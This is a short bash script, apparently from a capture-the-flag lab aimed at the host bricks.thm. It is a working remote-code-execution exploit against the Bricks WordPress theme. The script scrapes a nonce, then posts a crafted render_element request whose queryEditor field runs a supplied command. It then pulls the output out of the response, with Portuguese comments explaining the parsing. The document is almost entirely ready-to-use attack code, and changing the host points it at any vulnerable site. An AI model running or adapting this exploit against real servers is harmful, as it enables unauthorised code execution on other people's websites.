#!/bin/bash
# Script used to be able to run remote code executed in an exploit of Bricks render_elements - Bricks is a theme that can be used in WordPress

COMANDO=$1
HOST=bricks.thm

NONCE=$(curl -sk https://bricks.thm | grep -o '"nonce":"[^"]*"' | cut -d ":" -f 2 | tr -d '"')
echo $NONCE

RCE=$(curl -sk -X POST https://$HOST/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",
  "nonce" : "'$NONCE'",
  "element": {
    "name": "carousel",
    "settings": {
      "type": "posts",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new exception(`'$COMANDO'`);",
        "objectType": "post"
      }
    }
  }
}')

# -r (raw output) diz ao jq para devolver o texto "cru", sem formatação JSON.
#
# No nosso caso, o campo .data.html contém:
# "Exception: apache\n<div class=..."
# 
# Sem -r: recebemos ISTO TUDO como uma única string, incluindo as aspas e o \n literal.
# Com -r: o jq remove as aspas e interpreta o \n como uma quebra de linha (newline) REAL.
# 
# Resultado com -r:
# Exception: apache
# <div class=...
# 
# Agora temos duas linhas distintas! A primeira é o que queremos (apache),
# a segunda é o HTML residual. Por isso podemos usar head -1 para isolar
# apenas o resultado do comando.

echo $RCE | jq -r '.data.html' | cut -d ':' -f2 | head -1
